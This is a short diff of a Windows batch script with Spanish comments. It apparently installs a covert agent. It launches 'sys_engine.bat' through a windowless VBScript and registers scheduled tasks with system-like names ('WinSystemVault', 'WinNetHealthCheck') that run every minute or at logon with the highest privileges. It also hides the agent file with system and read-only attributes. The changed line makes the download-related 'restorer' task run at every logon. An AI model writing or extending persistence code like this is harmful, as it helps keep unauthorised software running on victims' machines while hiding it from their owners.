@@ -49,7 +49,7 @@ echo WshShell.Run "cmd.exe /c %DIR_AGENTE%\sys_engine.bat", 0, False >> "%DIR_AG
 schtasks /create /tn "WinSystemVault" /tr "wscript.exe %DIR_AGENTE%\run.vbs" /sc minute /mo 1 /rl highest /f >nul 2>&1
 
 :: Tarea 2: El Restaurador (Se mantiene diario para no saturar de descargas)
-schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c %DIR_SISTEMA%\WinNetHealth.bat" /sc daily /st 12:00 /rl highest /f >nul 2>&1
+schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c %DIR_SISTEMA%\WinNetHealth.bat" /sc onlogon /rl highest /f >nul 2>&1
 
 :: --- 7. PROTECCIÓN FINAL Y LIMPIEZA ---
 attrib +h +s +r "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
